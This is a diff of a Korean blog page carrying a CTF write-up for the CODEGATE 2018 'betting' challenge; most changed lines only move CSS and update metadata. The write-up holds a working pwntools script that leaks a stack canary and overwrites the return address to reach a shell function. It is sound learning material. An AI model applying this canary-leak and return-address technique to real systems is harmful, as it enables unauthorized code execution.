@@ -12,19 +12,19 @@
     
         <meta name="keywords" content="WriteUps,CodeGate">
     
-    <meta name="description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   betting Binary File  [사진 1-1] Canary가 걸려있으므로 Canary Leak을 해줘야">
+    <meta name="description" content="betting Binary File  [사진 1-1] Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램을 실행해보자.     [사진 1-2]  [사진 1-3] 함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다.">
 <meta name="keywords" content="WriteUps,CodeGate">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CODEGATE 2018 betting">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/02/19/betting/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   betting Binary File  [사진 1-1] Canary가 걸려있으므로 Canary Leak을 해줘야">
+<meta property="og:description" content="betting Binary File  [사진 1-1] Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램을 실행해보자.     [사진 1-2]  [사진 1-3] 함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다.">
 <meta property="og:locale" content="ko">
 <meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58035930-d7dc5d00-7b64-11e9-8581-e606a56e1015.PNG">
-<meta property="og:updated_time" content="2019-05-20T16:10:40.342Z">
+<meta property="og:updated_time" content="2019-05-22T06:01:30.790Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CODEGATE 2018 betting">
-<meta name="twitter:description" content="img.border-shadow{     border:1px solid #888888;     box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }   betting Binary File  [사진 1-1] Canary가 걸려있으므로 Canary Leak을 해줘야">
+<meta name="twitter:description" content="betting Binary File  [사진 1-1] Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램을 실행해보자.     [사진 1-2]  [사진 1-3] 함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다.">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58035930-d7dc5d00-7b64-11e9-8581-e606a56e1015.PNG">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/02/19/betting/">
@@ -178,13 +178,7 @@
         
         
         <div class="article-entry" itemprop="articleBody">
-            <style>
-  img.border-shadow{
-    border:1px solid #888888;
-    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-}
-</style>
-<h2 id="betting"><a class="markdownIt-Anchor" href="#betting"></a> betting</h2>
+            <h2 id="betting"><a class="markdownIt-Anchor" href="#betting"></a> betting</h2>
 <p><a href="/j0n9hyun.github.io/upload/betting">Binary File</a></p>
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035930-d7dc5d00-7b64-11e9-8581-e606a56e1015.PNG">
 <center><small>[사진 1-1]</small></center>
@@ -197,6 +191,12 @@ Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램
 함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다.
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./betting'</span>)</span><br><span class="line">helper = <span class="number">0x4008F6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">canary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"A"</span>*<span class="number">24</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"A"</span>*<span class="number">24</span> + <span class="string">"\n"</span>)</span><br><span class="line">    canary = u64(<span class="string">"\x00"</span> + r.recv()[:<span class="number">7</span>])</span><br><span class="line">    r.sendlineafter(<span class="string">"? "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += <span class="string">"A"</span>*<span class="number">40</span></span><br><span class="line">    payload += p64(canary)</span><br><span class="line">    payload += <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">    payload += p64(helper)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    canary()</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center>
+<style>
+  img.border-shadow{
+      border:1px solid #888888;
+      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+  }
+</style>
 
         </div>
         <footer class="article-footer">
@@ -280,20 +280,20 @@ Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램
         "genre": "WriteUps Pwn",
         "datePublished": "2019-02-19",
         "dateCreated": "2019-02-19",
-        "dateModified": "2019-05-21",
+        "dateModified": "2019-05-22",
         "url": "http://j0n9hyun.github.io/2019/02/19/betting/",
-        "description": "
-  img.border-shadow{
-    border:1px solid #888888;
-    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-}
-
- betting
+        "description": " betting
 Binary File
 
 [사진 1-1]
-Canary가 걸려있으므로 Canary Leak을 해줘야 "
-        "wordCount": 257
+Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램을 실행해보자.  
+
+
+[사진 1-2]
+
+[사진 1-3]
+함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다."
+        "wordCount": 263
     }
 </script>
 
